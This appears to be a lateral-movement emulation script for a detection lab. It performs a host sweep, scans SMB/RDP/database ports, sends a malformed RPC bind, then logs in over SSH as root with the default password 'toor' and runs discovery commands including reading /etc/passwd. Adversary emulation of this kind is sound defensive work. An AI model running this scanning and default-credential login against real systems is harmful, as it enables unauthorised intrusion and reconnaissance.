#!/usr/bin/env python3
"""
Threat Category 2: Lateral Movement
MITRE ATT&CK: T1021.002 — Remote Services: SMB/Windows Admin Shares
              T1046    — Network Service Discovery

Simulates:
  - Internal host discovery (ping sweep)
  - Port scan across 10 internal IPs on ports 135, 445, 3389, 22
  - Execution of whoami/net-like commands from a "compromised" process
  - WMI-style remote call simulation via raw socket
"""
import os
import socket
import time
import subprocess
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [LATERAL_MOVEMENT] %(levelname)s %(message)s"
)
log = logging.getLogger("lateral_movement")

TARGET_IP     = os.getenv("TARGET_IP", "172.25.0.20")
INTERNAL_SUBNET = "172.25.0"
SCAN_PORTS    = [22, 135, 445, 3389, 8080, 8000, 3306, 5432]
INTERNAL_RANGE = range(1, 25)


def ping_sweep():
    """Discover live hosts in the internal subnet."""
    log.info("Phase 1: Ping sweep of internal subnet...")
    live_hosts = []
    for i in INTERNAL_RANGE:
        ip = f"{INTERNAL_SUBNET}.{i}"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            result = s.connect_ex((ip, 80))
            if result == 0:
                live_hosts.append(ip)
                log.info(f"  Live host discovered: {ip}")
            s.close()
        except OSError:
            pass
    log.info(f"Ping sweep complete. {len(live_hosts)} hosts found.")
    return live_hosts


def port_scan(target_ips: list):
    """Scan SMB/RDP/admin ports on discovered hosts."""
    log.info(f"Phase 2: Port scanning {len(target_ips)} hosts on {len(SCAN_PORTS)} ports...")
    open_ports = {}
    for ip in target_ips:
        for port in SCAN_PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                result = s.connect_ex((ip, port))
                s.close()
                if result == 0:
                    open_ports.setdefault(ip, []).append(port)
                    log.info(f"  OPEN {ip}:{port}")
            except OSError:
                pass
            time.sleep(0.02)
    log.info(f"Port scan complete. Found open ports on {len(open_ports)} hosts.")
    return open_ports


def simulate_wmi_call(target_ip: str):
    """Simulate WMI-like remote command execution via raw TCP to port 135 (DCE/RPC)."""
    log.info(f"Phase 3: Simulating WMI/RPC call to {target_ip}:135...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((target_ip, 135))
        # Send a malformed bind request (triggers detection without real exploitation)
        s.sendall(b"\x05\x00\x0b\x03\x10\x00\x00\x00")
        time.sleep(0.5)
        s.close()
        log.info("  WMI simulation request sent.")
    except OSError as e:
        log.debug(f"  WMI sim socket error: {e}")


def simulate_endpoint_discovery(target_ip: str):
    """
    Execute discovery commands via SSH to actually trigger remote endpoint telemetry.
    These mimic 'whoami', 'id', 'hostname' being run post-compromise.
    """
    import paramiko
    log.info(f"Phase 4: Simulating post-compromise discovery commands remotely on {target_ip}...")
    cmds = [
        "id",
        "whoami",
        "hostname",
        "ip a",
        "netstat -tulpn",
        "ps aux",
        "cat /etc/passwd",
    ]
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, port=22, username="root", password="toor", timeout=5)
        for cmd in cmds:
            stdin, stdout, stderr = ssh.exec_command(cmd)
            out = stdout.read().decode('utf-8').strip()
            log.info(f"  Executed Remotely: {cmd} → {out[:60].replace(chr(10), ' ')}")
            time.sleep(0.3)
        ssh.close()
    except Exception as e:
        log.warning(f"  SSH connection for remote execution failed: {e}")


def main():
    log.info("═══ Starting Lateral Movement Attack Scenario ═══")
    # Phase 1: Discovery
    live_hosts = ping_sweep()
    targets = live_hosts if live_hosts else [TARGET_IP]
    time.sleep(2)
    # Phase 2: Port scan
    open_ports = port_scan(targets)
    time.sleep(2)
    # Phase 3: WMI-style call to primary target
    simulate_wmi_call(TARGET_IP)
    time.sleep(2)
    # Phase 4: Endpoint discovery (auditd trigger)
    simulate_endpoint_discovery(TARGET_IP)
    log.info("═══ Lateral Movement Scenario Complete ═══")


if __name__ == "__main__":
    main()
